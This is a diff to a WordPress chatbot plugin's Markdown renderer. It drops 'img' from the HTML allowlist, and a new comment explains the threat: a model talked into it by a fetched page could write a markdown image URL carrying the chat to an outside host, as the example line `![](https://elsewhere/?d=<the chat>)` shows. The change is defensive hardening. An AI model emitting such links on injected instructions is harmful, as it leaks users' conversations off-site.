@@ -18,7 +18,10 @@ use AlpacaBot\Vendor\League\CommonMark\MarkdownConverter;
  * refuses javascript:/data: links and caps nesting (a deeply nested list is a stack-depth
  * attack on the parser), and the result still goes through wp_kses against a small
  * allowlist, so an extension bug cannot let anything new through. The allowlist keeps
- * `class` on code and pre because the highlighter keys off `language-*`.
+ * `class` on code and pre because the highlighter keys off `language-*`. It keeps no `img`:
+ * the viewer's browser fetches an image as the reply renders, with no click, so a model that
+ * a fetched page talked into writing `![](https://elsewhere/?d=<the chat>)` would send the
+ * conversation off-site. A site that wants images adds `img` back through the filter below.
  */
 final class Markdown
 {
@@ -52,7 +55,7 @@ final class Markdown
     public static function allowedTags(): array
     {
         $attrs = ['class' => true];
-        $tags = ['p' => [], 'br' => [], 'strong' => [], 'em' => [], 'del' => [], 'code' => $attrs, 'pre' => $attrs, 'blockquote' => [], 'ul' => [], 'ol' => ['start' => true], 'li' => [], 'h1' => [], 'h2' => [], 'h3' => [], 'h4' => [], 'h5' => [], 'h6' => [], 'hr' => [], 'a' => ['href' => true, 'rel' => true, 'target' => true], 'table' => [], 'thead' => [], 'tbody' => [], 'tr' => [], 'th' => ['align' => true], 'td' => ['align' => true], 'img' => ['src' => true, 'alt' => true]];
+        $tags = ['p' => [], 'br' => [], 'strong' => [], 'em' => [], 'del' => [], 'code' => $attrs, 'pre' => $attrs, 'blockquote' => [], 'ul' => [], 'ol' => ['start' => true], 'li' => [], 'h1' => [], 'h2' => [], 'h3' => [], 'h4' => [], 'h5' => [], 'h6' => [], 'hr' => [], 'a' => ['href' => true, 'rel' => true, 'target' => true], 'table' => [], 'thead' => [], 'tbody' => [], 'tr' => [], 'th' => ['align' => true], 'td' => ['align' => true]];
         /**
          * Filters the wp_kses allowlist every rendered reply passes through (the chat screen, the
          * shortcodes, the REST view route). Add a tag or an attribute the model's markdown should
